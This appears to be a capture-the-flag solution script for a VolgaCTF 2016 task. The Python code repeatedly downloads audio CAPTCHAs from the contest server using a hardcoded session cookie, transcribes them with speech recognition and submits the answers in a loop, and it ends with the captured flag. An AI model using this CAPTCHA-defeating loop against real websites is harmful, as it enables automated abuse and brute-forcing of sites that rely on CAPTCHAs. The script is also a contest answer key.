import codecs
import os
import urllib
import urllib2
import speech_recognition as sr

url = 'http://yacst2.2016.volgactf.ru:8090/captcha'

opener = urllib2.build_opener()
opener.addheaders.append(('Cookie', 'JSESSIONID=s4Re0bJa4po1O8wPS9yGxF9FKxO4afQEnJbhhjiZ'))

post_opener = urllib2.build_opener(urllib2.HTTPHandler())
post_opener.addheaders.append(('Cookie', 'JSESSIONID=s4Re0bJa4po1O8wPS9yGxF9FKxO4afQEnJbhhjiZ'))


def download_wav():
    wav = opener.open(url).read()
    with codecs.open("captcha.wav", mode="wb") as output:
        output.write(wav)


def convert_to_speech2():
    r = sr.Recognizer()
    with sr.WavFile('captcha.wav') as source:
        audio = r.record(source)
        return r.recognize(audio)

def send_response(result):
    try:
        data = urllib.urlencode({'captcha': result})
        return post_opener.open(url, data=data).read()
    except:
        pass


def removeFile():
    os.remove("captcha.wav")


def main():
    for i in range(3000):
        try:
            print(i)
            download_wav()
            result = convert_to_speech2()
            print(result)
            removeFile()
            response = send_response(result)
        except:
            pass

main()
#FLAG: VolgaCTF{Sound IS L1ke M@th if A+B=C THEN C-B=A}